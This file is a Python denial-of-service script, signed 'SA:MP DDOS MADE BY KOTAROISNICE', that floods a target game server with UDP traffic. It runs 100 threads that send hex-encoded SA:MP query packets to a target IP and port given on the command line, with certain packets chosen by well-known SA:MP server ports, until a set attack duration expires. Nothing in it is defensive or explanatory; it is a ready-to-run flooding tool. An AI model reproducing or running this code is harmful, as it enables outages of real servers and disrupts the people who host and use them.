import socket
import struct
import codecs
import sys
import threading
import random
import time
import os

# Target IP, port, and attack duration
ip = sys.argv[1]
port = int(sys.argv[2])
attack_duration = int(sys.argv[3])  # Attack duration in seconds
orgip = ip

# Define packets
etits = [
    codecs.decode("53414d5090d91d4d611e700a465b00", "hex_codec"),
    codecs.decode("53414d509538e1a9611e63", "hex_codec"),
    codecs.decode("53414d509538e1a9611e69", "hex_codec"),
    codecs.decode("53414d509538e1a9611e72", "hex_codec"),
    codecs.decode("081e62da", "hex_codec"),
    codecs.decode("081e77da", "hex_codec"),
    codecs.decode("081e4dda", "hex_codec"),
    codecs.decode("021efd40", "hex_codec"),
    codecs.decode("021efd40", "hex_codec"),
    codecs.decode("081e7eda", "hex_codec")
]
print(f'SA:MP DDOS MADE BY KOTAROISNICE')

class MyThread(threading.Thread):
    def __init__(self, stop_event):
        super().__init__()
        self.stop_event = stop_event

    def run(self):
        start_time = time.time()
        while not self.stop_event.is_set():
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                    msg = etits[random.randrange(0, 3)]
                    sock.sendto(msg, (ip, port))
                    
                    # Send specific packets based on port
                    if port == 7777:
                        sock.sendto(etits[5], (ip, port))
                    elif port == 7796:
                        sock.sendto(etits[4], (ip, port))
                    elif port == 7771:
                        sock.sendto(etits[6], (ip, port))
                    elif port == 7784:
                        sock.sendto(etits[7], (ip, port))
                    elif port == 1111:
                        sock.sendto(etits[9], (ip, port))

                    # Check if attack time has elapsed
                    if time.time() - start_time > attack_duration:
                        self.stop_event.set()
            except Exception as e:
                print(f"Error: {e}")
                break

if __name__ == '__main__':
    stop_event = threading.Event()
    try:
        for _ in range(100):
            mythread = MyThread(stop_event)
            mythread.start()
            time.sleep(0.1)
    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print('#########################################################################')
        print('                  SA:MP DDOS MADE BY KOTAROISNICE                        ')
        print('#########################################################################')
        print(f'\n\nAttack on IP {orgip} has been stopped')
